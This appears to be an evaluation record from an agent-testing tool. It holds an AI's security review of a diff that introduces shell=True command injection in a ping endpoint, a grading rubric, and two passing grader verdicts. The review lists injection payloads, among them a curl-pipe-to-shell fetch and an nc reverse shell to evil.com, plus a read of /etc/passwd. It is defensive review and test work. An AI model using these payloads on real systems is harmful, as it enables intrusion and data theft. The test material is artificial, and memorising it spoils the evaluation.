@@ -1,0 +1,71 @@
+{
+  "caseId": "cmdi-shell-true",
+  "rep": 2,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-cmdi.patch"
+  ],
+  "output": "## Security Review: `diff-cmdi.patch`\n\n### 🔴 CRITICAL — OS Command Injection (CWE-78)\n\n**File:** `src/net/ping.py`, line 9\n\n```python\n# BEFORE (safe)\nresult = subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True)\n\n# AFTER (vulnerable)\nresult = subprocess.run(\"ping -c 1 \" + host, shell=True, capture_output=True, text=True)\n```\n\n**The problem:** This change replaces a safe argument-list invocation with a shell-interpreted string built by concatenating **untrusted user input** (`host` comes directly from `request.GET`). With `shell=True`, the entire string is passed to `/bin/sh`, so any shell metacharacters in `host` are interpreted as commands.\n\n**Exploitation:** An attacker fully controls `host` via the query string. Because the output is also returned in the response, this is a directly exploitable, output-visible RCE:\n\n```\nGET /ping?host=127.0.0.1;id\nGET /ping?host=;cat /etc/passwd\nGET /ping?host=$(curl http://evil.com/x.sh|sh)\nGET /ping?host=`whoami`\nGET /ping?host=127.0.0.1|nc%20evil.com%204444%20-e%20/bin/sh\n```\n\nEach results in arbitrary command execution on the server with the web application's privileges — leading to data exfiltration, lateral movement, reverse shells, and full host compromise.\n\n**Why the old code was safe:** Passing a list with `shell=False` (the default) executes `ping` directly via `execve` with `host` as a single literal argument. No shell is involved, so metacharacters have no special meaning — `;id` would simply be treated as an (invalid) hostname.\n\n### Remediation\n\n**Primary fix — revert to the argument-list form and drop `shell=True`:**\n\n```python\nresult = subprocess.run(\n    [\"ping\", \"-c\", \"1\", host],\n    capture_output=True, text=True, timeout=5,\n)\n```\n\n**Defense in depth (recommended even with the fix):**\n\n1. **Validate/allowlist the input** before use — reject anything that isn't a valid hostname/IP:\n   ```python\n   import ipaddress, re\n\n   host = request.GET.get(\"host\", \"\")\n   # Accept only a valid IP or RFC-1123 hostname\n   HOSTNAME_RE = re.compile(r\"^(?=.{1,253}$)([a-zA-Z0-9-]{1,63})(\\.[a-zA-Z0-9-]{1,63})*$\")\n   try:\n       ipaddress.ip_address(host)\n   except ValueError:\n       if not HOSTNAME_RE.match(host):\n           return JsonResponse({\"error\": \"invalid host\"}, status=400)\n   ```\n2. **Add `timeout=`** to `subprocess.run` to prevent resource-exhaustion/DoS via a hanging `ping`.\n3. Consider using `--` (`[\"ping\", \"-c\", \"1\", \"--\", host]`) so a `host` beginning with `-` can't be interpreted as a `ping` flag (argument injection).\n4. Longer term, prefer a native library (e.g., ICMP via a Python ping library) to avoid spawning subprocesses at all.\n\n### Summary\n\n| Severity | Issue | Location | Status |\n|----------|-------|----------|--------|\n| **Critical** | OS command injection via `shell=True` + string concat of user input | `ping.py:9` | Must fix before merge |\n\n**Verdict: 🚫 Block this change.** The diff introduces a textbook, remotely-exploitable command injection by regressing a previously safe call. Revert to the list-argument form and add input validation.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-18T22:33:38.701Z",
+  "durationMs": 46280,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the OS command injection vulnerability (CWE-78), explaining that the diff replaces a safe argument-list subprocess.run call with shell=True and string concatenation of the user-controlled `host` parameter from request.GET, provided concrete exploitation examples, and gave appropriate remediation—fully matching the rubric's required finding.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the OS command injection vulnerability (CWE-78), explaining that the diff replaces a safe argument-list subprocess.run call with shell=True and string concatenation of the user-controlled `host` parameter from request.GET, provided concrete exploitation examples, and gave appropriate remediation—fully matching the rubric's required finding."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent's review correctly and clearly identifies the OS command injection vulnerability (CWE-78), noting that the user-controlled 'host' parameter from request.GET is concatenated into a shell command string and passed to subprocess.run with shell=True, and explains the exploitation vectors and remediation, which satisfies the rubric's requirement.",
+            "raw": "VERDICT: PASS\nREASON: The agent's review correctly and clearly identifies the OS command injection vulnerability (CWE-78), noting that the user-controlled 'host' parameter from request.GET is concatenated into a shell command string and passed to subprocess.run with shell=True, and explains the exploitation vectors and remediation, which satisfies the rubric's requirement."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe review must correctly identify an OS command injection vulnerability in the diff: the user-controlled 'host' value from request.GET is passed to subprocess.run with shell=True via string concatenation, allowing shell command injection. PASS only if command injection (or an equivalent unambiguous description) is identified as a genuine security vulnerability; FAIL if it misses it or makes only stylistic comments.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n## Security Review: `diff-cmdi.patch`\n\n### 🔴 CRITICAL — OS Command Injection (CWE-78)\n\n**File:** `src/net/ping.py`, line 9\n\n```python\n# BEFORE (safe)\nresult = subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True)\n\n# AFTER (vulnerable)\nresult = subprocess.run(\"ping -c 1 \" + host, shell=True, capture_output=True, text=True)\n```\n\n**The problem:** This change replaces a safe argument-list invocation with a shell-interpreted string built by concatenating **untrusted user input** (`host` comes directly from `request.GET`). With `shell=True`, the entire string is passed to `/bin/sh`, so any shell metacharacters in `host` are interpreted as commands.\n\n**Exploitation:** An attacker fully controls `host` via the query string. Because the output is also returned in the response, this is a directly exploitable, output-visible RCE:\n\n```\nGET /ping?host=127.0.0.1;id\nGET /ping?host=;cat /etc/passwd\nGET /ping?host=$(curl http://evil.com/x.sh|sh)\nGET /ping?host=`whoami`\nGET /ping?host=127.0.0.1|nc%20evil.com%204444%20-e%20/bin/sh\n```\n\nEach results in arbitrary command execution on the server with the web application's privileges — leading to data exfiltration, lateral movement, reverse shells, and full host compromise.\n\n**Why the old code was safe:** Passing a list with `shell=False` (the default) executes `ping` directly via `execve` with `host` as a single literal argument. No shell is involved, so metacharacters have no special meaning — `;id` would simply be treated as an (invalid) hostname.\n\n### Remediation\n\n**Primary fix — revert to the argument-list form and drop `shell=True`:**\n\n```python\nresult = subprocess.run(\n    [\"ping\", \"-c\", \"1\", host],\n    capture_output=True, text=True, timeout=5,\n)\n```\n\n**Defense in depth (recommended even with the fix):**\n\n1. **Validate/allowlist the input** before use — reject anything that isn't a valid hostname/IP:\n   ```python\n   import ipaddress, re\n\n   host = request.GET.get(\"host\", \"\")\n   # Accept only a valid IP or RFC-1123 hostname\n   HOSTNAME_RE = re.compile(r\"^(?=.{1,253}$)([a-zA-Z0-9-]{1,63})(\\.[a-zA-Z0-9-]{1,63})*$\")\n   try:\n       ipaddress.ip_address(host)\n   except ValueError:\n       if not HOSTNAME_RE.match(host):\n           return JsonResponse({\"error\": \"invalid host\"}, status=400)\n   ```\n2. **Add `timeout=`** to `subprocess.run` to prevent resource-exhaustion/DoS via a hanging `ping`.\n3. Consider using `--` (`[\"ping\", \"-c\", \"1\", \"--\", host]`) so a `host` beginning with `-` can't be interpreted as a `ping` flag (argument injection).\n4. Longer term, prefer a native library (e.g., ICMP via a Python ping library) to avoid spawning subprocesses at all.\n\n### Summary\n\n| Severity | Issue | Location | Status |\n|----------|-------|----------|--------|\n| **Critical** | OS command injection via `shell=True` + string concat of user input | `ping.py:9` | Must fix before merge |\n\n**Verdict: 🚫 Block this change.** The diff introduces a textbook, remotely-exploitable command injection by regressing a previously safe call. Revert to the list-argument form and add input validation.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "usage": {
+    "input_tokens": 8,
+    "output_tokens": 1825,
+    "model": "opus"
+  },
+  "transcript": {
+    "subtype": "success",
+    "num_turns": 5,
+    "total_cost_usd": 0.146927,
+    "modelUsage": {
+      "claude-haiku-4-5-20251001": {
+        "inputTokens": 541,
+        "outputTokens": 13,
+        "cacheReadInputTokens": 0,
+        "cacheCreationInputTokens": 0,
+        "webSearchRequests": 0,
+        "costUSD": 0.000606,
+        "contextWindow": 200000,
+        "maxOutputTokens": 32000
+      },
+      "claude-opus-4-8": {
+        "inputTokens": 8,
+        "outputTokens": 1825,
+        "cacheReadInputTokens": 89692,
+        "cacheCreationInputTokens": 5581,
+        "webSearchRequests": 0,
+        "costUSD": 0.146321,
+        "contextWindow": 1000000,
+        "maxOutputTokens": 64000
+      }
+    },
+    "_note": "SDK message stream removed for privacy; summary retained"
+  }
+}
